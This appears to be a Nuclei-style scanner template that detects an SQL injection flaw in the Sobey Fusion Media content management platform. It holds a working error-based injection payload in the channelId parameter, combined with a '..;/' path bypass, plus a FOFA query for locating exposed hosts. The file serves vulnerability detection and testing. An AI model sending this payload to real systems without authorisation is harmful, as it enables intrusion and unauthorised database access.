id: sobey-imcmp-countjztarticlegroupbychannel2-sqli
info:
  name: Sobey Fusion Media Content Management Platform SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: Sobey Fusion Media Content Management Platform
    fofa: body="/Sc-TaskMonitoring/" || header="Sobey"

variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticleGroupByChannel2?siteCode=&token=&userCode=admin&channelId=1&catalogid=1&channelId=1+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Sobey"
          - "Exception Report"
          - "~{{t2}}~"
          - "java.sql.SQLException"
